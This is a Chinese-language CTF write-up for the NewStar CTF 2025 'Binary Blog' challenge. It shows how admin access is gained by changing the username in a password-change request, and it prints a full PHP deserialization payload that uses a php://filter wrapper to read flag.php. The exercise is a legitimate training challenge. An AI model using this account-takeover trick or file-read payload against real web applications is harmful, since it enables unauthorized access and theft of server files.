---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

WIP

# Binary Blog
首先我们先注册一个用户去看看其整体框架

同时用dirsearch去扫一下

![1](https://github.com/Yguigen/Related-images/blob/main/newstar/1.png?raw=true)

这里看到flag.php文件推测，flag应该就在这里

然后我们在主页中看到admin账户

![2](https://github.com/Yguigen/Related-images/blob/main/newstar/2.png?raw=true)

但是强制爆破没成功，推测可能需要提权或者越权

![3](https://github.com/Yguigen/Related-images/blob/main/newstar/3.png?raw=true)

接着我们在个人信息中抓到这个包，然后尝试修改

这里我们发现从修改id和name都无法修改成为admin用户

接着我们尝试从另一个入口（修改密码）处如何看看

![4](https://github.com/Yguigen/Related-images/blob/main/newstar/4.png?raw=true)

发现这个和上面的情况不一样，尝试修改username为admin试试

![5](https://github.com/Yguigen/Related-images/blob/main/newstar/5.png?raw=true)

可以发现用户admin密码成功修改成123456q了

之后尝试登录admin:123456q

![6](https://github.com/Yguigen/Related-images/blob/main/newstar/6.png?raw=true)成功登录

接着我们继续看看其接口情况

![7](https://github.com/Yguigen/Related-images/blob/main/newstar/7.png?raw=true)然后我们在博客管理界面发现能够上传文件，推测是文件上传漏洞，同时还有导出功能，先导出下来看看情况

![8](https://github.com/Yguigen/Related-images/blob/main/newstar/8.png?raw=true)

这里我们发现这不是反序列内容嘛，大概率这题就是反序列了，而不是文件上传。

同时我们在

![9](https://github.com/Yguigen/Related-images/blob/main/newstar/9.png?raw=true)

![10](https://github.com/Yguigen/Related-images/blob/main/newstar/10.png?raw=true)

这里发现一个php文件，同时在页面中也有个迷惑的提示，于是我们可以尝试写入flag.php文件，发现没有成功，于是我们尝试其他方法——构造伪协议

根据反序列构造payload

```php
a:4:{s:9:"timestamp";i:1759054823;s:7:"version";s:3:"1.0";s:4:"blog";O:4:"Blog":8:{s:2:"id";i:1;s:5:"title";s:24:"欢迎使用博客系统";s:7:"content";s:280:"这是一个功能完整的博客系统，您可以在这里发布、编辑和管理您的博客内容。

系统特点：
- 支持用户注册和登录
- 管理员可以管理所有用户和博客
- 支持富文本编辑
- 响应式设计，适配各种设备

开始使用吧！";s:7:"user_id";i:1;s:8:"username";s:5:"admin";s:10:"created_at";s:19:"2025-09-28 18:02:36";s:10:"updated_at";s:19:"2025-09-28 18:02:36";s:8:"template";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}s:9:"signature";s:64:"231d1e254f4cdd5ac689fbac0fb0b2722cbcc2fcc3a13d7b0203ca674f1a46a8";}
```

这里主要是php://filter/read=convert.base64-encode/resource=flag.php这里的功能

得到flag

![11](https://github.com/Yguigen/Related-images/blob/main/newstar/11.png?raw=true)

![12](https://github.com/Yguigen/Related-images/blob/main/newstar/12.png?raw=true)
